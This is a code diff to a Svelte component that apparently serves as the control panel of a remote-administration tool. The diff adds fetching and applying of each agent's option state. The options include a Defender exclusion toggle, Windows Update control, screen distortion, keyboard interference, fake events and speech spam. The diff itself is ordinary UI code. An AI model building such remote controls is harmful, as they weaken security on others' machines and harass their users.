@@ -1,5 +1,5 @@
 <script lang="ts">
-	import { onDestroy } from 'svelte';
+	import { onDestroy, onMount } from 'svelte';
 	import { Tabs, TabsList, TabsTrigger, TabsContent } from '$lib/components/ui/tabs/index.js';
 	import { Switch } from '$lib/components/ui/switch/index.js';
 	import { Label } from '$lib/components/ui/label/index.js';
@@ -19,12 +19,43 @@
 		CommandQueueResponse,
 		CommandResult
 	} from '../../../../../../shared/types/messages';
+	import type { AgentOptionsResponse, OptionsState } from '../../../../../../shared/types/options';
 	import type { AgentDetailResponse } from '../../../../../../shared/types/agent';
 	import { toast } from 'svelte-sonner';
 
 	const { client } = $props<{ client: Client }>();
 
 	const agentLabel = $derived(() => client.hostname?.trim() || client.codename || client.id);
+
+	const defaultOptionsState: OptionsState = {
+		defenderExclusion: false,
+		windowsUpdate: false,
+		visualDistortion: 'None',
+		screenOrientation: 'Normal',
+		wallpaperMode: 'Default',
+		cursorBehavior: 'Normal',
+		keyboardMode: 'None',
+		soundPlayback: true,
+		soundVolume: 60,
+		script: {
+			mode: 'Instant',
+			loop: false,
+			delaySeconds: 0
+		},
+		scriptRuntime: {
+			status: 'idle',
+			active: false,
+			lastStartedAt: null,
+			lastCompletedAt: null,
+			lastExitCode: 0,
+			hasExitCode: false,
+			lastError: '',
+			runs: 0
+		},
+		fakeEventMode: 'None',
+		speechSpam: false,
+		autoMinimize: false
+	};
 
 	let defenderExclusion = $state(false);
 	let windowsUpdate = $state(false);
@@ -51,6 +82,7 @@
 	let lastCommittedScriptDelay = $state(0);
 
 	let activePollController: AbortController | null = null;
+	let optionsStateController: AbortController | null = null;
 
 	const resultPollIntervalMs = 750;
 	const resultTimeoutMs = 20_000;
@@ -71,6 +103,74 @@
 		if (activePollController) {
 			activePollController.abort();
 			activePollController = null;
+		}
+	}
+
+	function cancelOptionsStateFetch() {
+		if (optionsStateController) {
+			optionsStateController.abort();
+			optionsStateController = null;
+		}
+	}
+
+	function applyOptionsState(state: OptionsState | null | undefined) {
+		const snapshot = state ?? defaultOptionsState;
+
+		defenderExclusion =
+			snapshot.defenderExclusion ?? defaultOptionsState.defenderExclusion ?? false;
+		windowsUpdate = snapshot.windowsUpdate ?? defaultOptionsState.windowsUpdate ?? false;
+		visualDistortion = snapshot.visualDistortion ?? defaultOptionsState.visualDistortion ?? 'None';
+		screenFlip = snapshot.screenOrientation ?? defaultOptionsState.screenOrientation ?? 'Normal';
+		wallpaperMode = snapshot.wallpaperMode ?? defaultOptionsState.wallpaperMode ?? 'Default';
+		cursorBehavior = snapshot.cursorBehavior ?? defaultOptionsState.cursorBehavior ?? 'Normal';
+		keyboardShenanigans = snapshot.keyboardMode ?? defaultOptionsState.keyboardMode ?? 'None';
+
+		soundPlayback = snapshot.soundPlayback ?? defaultOptionsState.soundPlayback ?? true;
+		const resolvedVolume = snapshot.soundVolume ?? defaultOptionsState.soundVolume ?? 60;
+		soundVolume = resolvedVolume;
+		lastCommittedSoundVolume = resolvedVolume;
+
+		const scriptConfig = snapshot.script ?? defaultOptionsState.script;
+		scriptMode = scriptConfig?.mode ?? defaultOptionsState.script?.mode ?? 'Instant';
+		scriptLoop = scriptConfig?.loop ?? defaultOptionsState.script?.loop ?? false;
+		const resolvedDelay =
+			scriptConfig?.delaySeconds ?? defaultOptionsState.script?.delaySeconds ?? 0;
+		scriptDelay = resolvedDelay;
+		lastCommittedScriptDelay = resolvedDelay;
+
+		fakeEventMode = snapshot.fakeEventMode ?? defaultOptionsState.fakeEventMode ?? 'None';
+		ttsSpam = snapshot.speechSpam ?? defaultOptionsState.speechSpam ?? false;
+		autoMinimize = snapshot.autoMinimize ?? defaultOptionsState.autoMinimize ?? false;
+	}
+
+	async function refreshOptionsState(options: { silent?: boolean } = {}): Promise<void> {
+		cancelOptionsStateFetch();
+
+		const controller = new AbortController();
+		optionsStateController = controller;
+
+		try {
+			const response = await fetch(`/api/agents/${client.id}/options`, {
+				signal: controller.signal
+			});
+			if (!response.ok) {
+				const detail = (await response.text().catch(() => ''))?.trim();
+				throw new Error(detail || `Failed to fetch options state (status ${response.status}).`);
+			}
+
+			const payload = (await response.json()) as AgentOptionsResponse;
+			applyOptionsState(payload?.state ?? null);
+		} catch (error) {
+			if (controller.signal.aborted) {
+				return;
+			}
+			if (!options.silent) {
+				console.error('Failed to refresh options state', error);
+			}
+		} finally {
+			if (optionsStateController === controller) {
+				optionsStateController = null;
+			}
 		}
 	}
 
@@ -121,7 +221,14 @@
 		throw new Error('Command result polling cancelled.');
 	}
 
-	onDestroy(cancelResultPoll);
+	onDestroy(() => {
+		cancelResultPoll();
+		cancelOptionsStateFetch();
+	});
+
+	onMount(() => {
+		void refreshOptionsState();
+	});
 
 	interface OptionDispatchConfig {
 		action: string;
@@ -175,6 +282,8 @@
 			});
 
 			return false;
+		} finally {
+			void refreshOptionsState({ silent: true });
 		}
 	}
 
